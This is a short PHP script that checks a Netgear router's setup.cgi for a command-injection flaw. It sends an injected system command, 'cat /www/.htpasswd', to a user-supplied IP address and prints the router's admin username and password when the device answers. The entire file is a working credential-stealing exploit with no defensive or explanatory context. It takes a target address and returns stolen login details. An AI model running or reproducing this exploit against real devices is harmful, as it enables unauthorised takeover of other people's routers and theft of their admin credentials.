<?php

if (isset($_POST['submit'])){


$ip = $_REQUEST['ip'];


//set POST variables 
$url = 'http://'.$ip.'/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=cat+/www/.htpasswd&curpath=/&currentsetting.htm=1'; 
 //open connection 
$ch = curl_init(); 
//set the url, number of POST vars, POST data 
curl_setopt($ch,CURLOPT_URL, $url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, '3');
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6');
//execute post 
$result = curl_exec($ch); 

 

$responseHttpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($responseHttpCode == 403) 
		{
            echo ('<br><br><br><center><font color="black">The Router is Not Vulnerable!!!:<br>');
        } 
		if($responseHttpCode == 200) 
		{
            echo ('<br><br><br><center><font color="red">The Router is Vulnerable!!!:<br>
			Admin username and password is:</font><h2>'.$result.'</h2></center></font>');
        } 
		if($responseHttpCode == 0) 
		{
		echo ('<br><br><br><center><font color="black">No Response from IP');
		}
curl_close($ch);
}
?>
